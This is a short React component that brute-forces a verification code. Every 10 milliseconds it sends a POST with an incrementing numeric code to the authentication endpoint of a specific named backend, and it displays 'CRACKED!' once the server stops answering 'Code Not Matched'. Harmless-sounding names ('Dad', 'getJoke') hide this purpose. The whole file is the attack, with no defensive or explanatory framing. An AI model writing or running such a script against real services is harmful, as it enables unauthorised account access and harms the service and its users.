import { useState, useEffect } from "react";

function Dad() {
  let [counter, setCounter] = useState(0);
  const [status, setStatus] = useState("Cracking..");

  function makeOptions(code) {
    var opts = {
      method: "POST",
      headers: {
        "Content-type": "application/json",
        Accept: "application/json",
      },
    };

    opts.body = JSON.stringify({ code: code, step_id: "2" });

    return opts;
  }

  function getJoke(code) {
    const URL = "https://imcbackend.spacesinteractive.co/auth/verify";

    fetch(URL, makeOptions(code))
      .then((res) => res.json())
      .then((data) => {
        if (data.message != "Code Not Matched") {
          console.info(code);
          setStatus("CRACKED! " + code);
        }
      });
  }

  useEffect(() => {
    const interval = setInterval(() => {
      if (status === "Cracking..") {
        getJoke(counter);
        setCounter((counter += 1));
      }
    }, 10);

    return () => clearInterval(interval);
  }, []);

  return (
    <div>
      <p>Status:</p>
      <p>{status}</p>
    </div>
  );
}

export default Dad;
